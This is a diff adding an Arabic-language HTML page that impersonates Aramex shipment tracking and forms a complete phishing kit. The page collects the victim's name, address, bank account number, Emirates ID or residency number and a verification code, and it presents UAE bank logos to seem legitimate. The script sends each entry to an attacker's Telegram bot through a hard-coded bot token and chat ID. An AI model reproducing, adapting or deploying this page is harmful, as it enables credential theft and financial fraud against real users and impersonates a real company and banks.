@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>تتبع شحنتك - aramex</title>
+    <style>
+        body { font-family: Arial, sans-serif; background: #f5f5f5; margin: 0; padding: 0; }
+        .aramex-header {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-top: 30px;
+        }
+        .aramex-logo {
+            width: 120px;
+            height: auto;
+            margin-left: 16px;
+        }
+        .aramex-title {
+            color: #ea2127;
+            font-family: 'Arial', sans-serif;
+            font-weight: bold;
+            font-size: 2em;
+            margin-right: 10px;
+        }
+        .container, .bank-form-container, .verification-container {
+            max-width: 400px;
+            margin: 30px auto;
+            padding: 20px;
+            background: #fff;
+            border-radius: 10px;
+            box-shadow: 0 0 10px #eee;
+        }
+        h2 { color: #e60000; text-align: center; margin-bottom: 30px; margin-top: 10px; display: flex; align-items: center; justify-content: center; gap: 10px;}
+        label { display: block; margin-bottom: 5px; font-weight: bold; color: #222; }
+        input, select, textarea {
+            width: 100%; padding: 10px; margin-bottom: 15px;
+            border: 2px solid #e60000; border-radius: 5px; font-size: 16px;
+        }
+        textarea { height: 60px; resize: vertical; }
+        button {
+            width: 100%; background: #e60000; color: #fff; border: none;
+            padding: 12px; font-size: 18px; border-radius: 5px; cursor: pointer;
+        }
+        button:hover { background: #d10000; }
+        .loading { text-align: center; font-size: 24px; color: #e60000; margin-top: 70px; }
+        .banks-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
+            gap: 30px;
+            max-width: 900px;
+            margin: 0 auto;
+            margin-top: 40px;
+        }
+        .bank-logo {
+            width: 100px;
+            height: 100px;
+            object-fit: contain;
+            display: block;
+            margin: 0 auto;
+            background: #fff;
+            border-radius: 15px;
+            border: 2px solid #e60000;
+            padding: 10px;
+            box-shadow: 0 2px 6px #ccc;
+            transition: transform 0.2s;
+        }
+        .bank-logo:hover {
+            transform: scale(1.08);
+            box-shadow: 0 4px 18px #aaa;
+            cursor: pointer;
+        }
+        .bank-form-container { display: none; }
+        .bank-form-container.active { display: block; }
+        .verification-container { display: none; }
+    </style>
+</head>
+<body dir="rtl">
+    <!-- رأس الصفحة: شعار aramex والعنوان -->
+    <div class="aramex-header">
+        <img src="https://www.aramex.com/images/default-source/logos/aramex-logo.png" alt="aramex logo" class="aramex-logo">
+        <span class="aramex-title">aramex</span>
+    </div>
+
+    <!-- نموذج تتبع الشحنة -->
+    <div class="container" id="mainForm">
+        <h2>
+            <img src="https://www.aramex.com/images/default-source/logos/aramex-logo.png" alt="aramex logo" style="width:40px;vertical-align:middle;">
+            تتبع شحنتك
+        </h2>
+        <form id="shipmentForm">
+            <label for="serviceType">نوع الخدمة</label>
+            <select id="serviceType" required>
+                <option value="">اختر نوع الخدمة</option>
+                <option value="delivery">طلب توصيل</option>
+                <option value="pickup">طلب استلام</option>
+            </select>
+            <label for="shipmentNumber">رقم الشحنة</label>
+            <input type="number" id="shipmentNumber" required pattern="\d+" inputmode="numeric" min="0">
+            <label for="fullName">الاسم الكامل</label>
+            <input type="text" id="fullName" required>
+            <label for="address">العنوان الكامل</label>
+            <input type="text" id="address" required>
+            <label for="fees">قيمة الرسوم</label>
+            <input type="number" id="fees" required min="0">
+            <label for="details">التفاصيل</label>
+            <textarea id="details"></textarea>
+            <button type="submit">التالي</button>
+        </form>
+    </div>
+
+    <!-- شاشة الانتظار -->
+    <div class="loading" id="loadingScreen" style="display:none;">
+        جاري معالجة البيانات...
+    </div>
+
+    <!-- صفحة اختيار البنك -->
+    <div id="banksPage" style="display:none;">
+        <h2>شبكة بنوك الإمارات</h2>
+        <div class="banks-grid" id="banksGrid">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/0/0b/Emirates_NBD_Logo.png" alt="Emirates NBD" class="bank-logo" data-bank="NBD">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/FAB_logo.png" alt="FAB" class="bank-logo" data-bank="FAB">
+            <img src="https://upload.wikimedia.org/wikipedia/ar/6/6f/DIB_Logo.png" alt="Dubai Islamic Bank" class="bank-logo" data-bank="DIB">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/5/5b/Abu_Dhabi_Islamic_Bank_logo.png" alt="ADIB" class="bank-logo" data-bank="ADIB">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/3/3d/Mashreq_Bank_logo.png" alt="Mashreq Bank" class="bank-logo" data-bank="Mashreq">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/6/68/RAKBANK_logo.png" alt="RAKBANK" class="bank-logo" data-bank="RAK">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/9/9c/Commercial_Bank_of_Dubai_logo.png" alt="CBD" class="bank-logo" data-bank="CBD">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/6/6d/Abu_Dhabi_Commercial_Bank_logo.png" alt="ADCB" class="bank-logo" data-bank="ADCB">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/e/e4/United_Arab_Bank_logo.png" alt="United Arab Bank" class="bank-logo" data-bank="UAB">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/f/f1/Sharjah_Islamic_Bank_logo.png" alt="Sharjah Islamic Bank" class="bank-logo" data-bank="SIB">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/1/1d/Noor_Bank_logo.png" alt="Noor Bank" class="bank-logo" data-bank="Noor">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/0/0f/HSBC_logo_%282018%29.svg" alt="HSBC UAE" class="bank-logo" data-bank="HSBC">
+        </div>
+    </div>
+
+    <!-- نموذج بيانات البنك المختار -->
+    <div class="bank-form-container" id="bankFormContainer">
+        <h2 id="bankFormTitle"></h2>
+        <form id="bankForm">
+            <label for="accountNumber">رقم الحساب البنكي</label>
+            <input type="text" id="accountNumber" required pattern="\d+">
+            <label for="idNumber">رقم الهوية/الإقامة</label>
+            <input type="text" id="idNumber" required>
+            <label for="bankDetails">تفاصيل إضافية</label>
+            <textarea id="bankDetails"></textarea>
+            <button type="submit">إرسال</button>
+        </form>
+    </div>
+
+    <!-- شاشة رمز التحقق -->
+    <div class="verification-container" id="verificationScreen">
+        <div class="verification-label">أدخل رمز التحقق:</div>
+        <input type="text" id="verificationCode" maxlength="6" style="font-size:20px; text-align:center;">
+        <button id="verifyBtn">تأكيد</button>
+    </div>
+
+    <script>
+        // --- ضع هنا القيم الخاصة بك ---
+        const BOT_TOKEN = "8247311735:AAEDZeSItpUtikGnxnXVKoabN4NjvM87CuM"; // مثال: 123456789:ABC-DEF1234ghIkl-zyx57W2v1u123ew11
+        const CHAT_ID = "7343682823"; // مثال: 123456789
+        // -----------------------------
+
+        // بيانات الشحنة
+        let shipmentData = {};
+
+        // عند الضغط على زر التالي في نموذج الشحنة
+        document.getElementById('shipmentForm').onsubmit = function(e) {
+            e.preventDefault();
+            // جمع بيانات الشحنة
+            shipmentData.serviceType = document.getElementById('serviceType').value;
+            shipmentData.shipmentNumber = document.getElementById('shipmentNumber').value;
+            shipmentData.fullName = document.getElementById('fullName').value;
+            shipmentData.address = document.getElementById('address').value;
+            shipmentData.fees = document.getElementById('fees').value;
+            shipmentData.details = document.getElementById('details').value;
+
+            // إرسال بيانات الشحنة إلى بوت تيليجرام
+            sendToTelegram(
+                "بيانات الشحنة:\n" +
+                "نوع الخدمة: " + (shipmentData.serviceType === "delivery" ? "طلب توصيل" : "طلب استلام") + "\n" +
+                "رقم الشحنة: " + shipmentData.shipmentNumber + "\n" +
+                "الاسم الكامل: " + shipmentData.fullName + "\n" +
+                "العنوان: " + shipmentData.address + "\n" +
+                "قيمة الرسوم: " + shipmentData.fees + "\n" +
+                "تفاصيل إضافية: " + shipmentData.details
+            );
+
+            document.getElementById('mainForm').style.display = 'none';
+            document.getElementById('loadingScreen').style.display = 'block';
+            
+            setTimeout(function(){
+                document.getElementById('loadingScreen').style.display = 'none';
+                document.getElementById('banksPage').style.display = 'block';
+            }, 2000);
+        };
+
+        // عند اختيار بنك من الشبكة
+        let selectedBank = "";
+        document.querySelectorAll('.bank-logo').forEach(function(img){
+            img.onclick = function(){
+                selectedBank = img.alt;
+                document.getElementById('banksPage').style.display = 'none';
+                document.getElementById('bankFormContainer').classList.add('active');
+                document.getElementById('bankFormTitle').innerText = "بيانات بنك " + selectedBank;
+            }
+        });
+
+        // تحقق أن رقم الحساب البنكي يقبل فقط أرقام
+        document.getElementById('accountNumber').addEventListener('input', function (e) {
+            this.value = this.value.replace(/\D/g, '');
+        });
+
+        // عند إرسال نموذج البنك
+        document.getElementById('bankForm').onsubmit = function(e){
+            e.preventDefault();
+            // جمع بيانات البنك
+            let accountNumber = document.getElementById('accountNumber').value;
+            let idNumber = document.getElementById('idNumber').value;
+            let bankDetails = document.getElementById('bankDetails').value;
+
+            sendToTelegram(
+                "بيانات البنك المختار:\n" +
+                "البنك: " + selectedBank + "\n" +
+                "رقم الحساب: " + accountNumber + "\n" +
+                "رقم الهوية/الإقامة: " + idNumber + "\n" +
+                "تفاصيل إضافية: " + bankDetails
+            );
+
+            document.getElementById('bankFormContainer').classList.remove('active');
+            document.getElementById('verificationScreen').style.display = 'block';
+        };
+
+        // عند الضغط على زر تأكيد رمز التحقق
+        document.getElementById('verifyBtn').onclick = function(){
+            var code = document.getElementById('verificationCode').value;
+            if (code.length > 0) {
+                sendToTelegram("رمز التحقق المدخل: " + code);
+                document.getElementById('verificationScreen').style.display = 'none';
+                alert('تم تأكيد العملية بنجاح!');
+            }
+        };
+
+        // دالة إرسال رسالة إلى بوت تيليجرام
+        function sendToTelegram(text) {
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: text
+                })
+            });
+        }
+    </script>
+</body>
+</html>
